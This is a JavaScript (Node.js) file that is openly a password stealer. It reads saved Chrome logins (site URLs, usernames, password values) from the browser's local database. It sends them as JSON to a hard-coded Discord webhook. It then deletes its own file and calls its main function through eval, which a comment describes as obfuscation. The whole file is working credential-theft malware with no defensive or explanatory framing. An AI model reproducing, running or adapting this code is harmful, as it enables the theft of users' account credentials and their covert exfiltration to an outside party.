const fs = require('fs');
const path = require('path');
const axios = require('axios');
const webhook = 'https://discord.com/api/webhooks/1397869568319291515/6O_Zciy0jmpsQAbQtm82L6m-diLhrc3ib9QdDKH4sFtYu3XoAXXiEGnmK4ujPQL20iyl';

function getChromePasswords() {
    const appData = process.env.LOCALAPPDATA;
    const chromePath = path.join(appData, 'Google', 'Chrome', 'User Data', 'Default', 'login data');
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database(chromePath);

    return new Promise((resolve, reject) => {
        db.all(`SELECT origin_url, username_value, password_value FROM logins`, (err, rows) => {
            if (err) {
                reject(err);
            } else {
                resolve(rows);
            }
            db.close();
        });
    });
}

async function sendToWebhook(data) {
    try {
        await axios.post(webhook, { content: JSON.stringify(data, null, 2) });
        console.log('Data sent to webhook');
    } catch (error) {
        console.error('Error sending data to webhook:', error);
    }
}

function deleteScriptFile(filePath) {
    fs.unlink(filePath, (err) => {
        if (err) {
            console.error('Error deleting script file:', err);
        } else {
            console.log('Script file deleted successfully');
        }
    });
}

async function main() {
    try {
        const passwords = await getChromePasswords();
        await sendToWebhook(passwords);
        deleteScriptFile(__filename);
    } catch (error) {
        console.error('Error grabbing passwords:', error);
    }
}

// Obfuscate the main function call
eval('main()');